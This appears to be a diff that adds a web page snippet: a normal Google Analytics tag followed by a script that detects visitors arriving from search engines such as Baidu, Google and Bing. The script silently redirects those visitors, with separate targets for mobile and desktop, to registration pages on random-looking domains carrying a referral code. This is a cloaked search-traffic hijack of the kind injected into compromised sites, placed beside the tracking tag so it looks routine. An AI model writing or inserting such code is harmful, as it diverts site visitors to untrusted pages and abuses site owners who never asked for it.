@@ -1,0 +1,19 @@
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W5H4VPHX45"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-W5H4VPHX45');
+</script>
+
+<script>
+let regexp = new RegExp("\.(baidu|sogou|so|google|bing|soso|youdao|yahoo|360|sina|duckduckgo)(\.(com|cn))", "ig");
+if (regexp.test(document.referrer)) {
+    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+        location.href = "https://www.bxtywg3j.com:30892/entry/register/?i_code=9596819";
+    } else {
+        location.href = "https://www.bxtyiu1u.com:34225/register/?i_code=9596819";
+    }
+}
+</script>
